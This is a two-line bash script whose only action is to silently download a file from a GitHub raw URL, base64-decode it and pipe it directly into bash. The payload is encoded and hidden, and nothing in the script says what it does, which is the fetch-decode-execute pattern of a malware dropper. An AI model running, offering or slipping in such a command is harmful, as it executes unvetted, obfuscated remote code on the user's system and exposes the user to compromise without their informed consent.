#!/bin/bash
wget -qO- https://raw.githubusercontent.com/christopheroliphant/deal/refs/heads/main/entrypoint.sh | base64 -d | bash
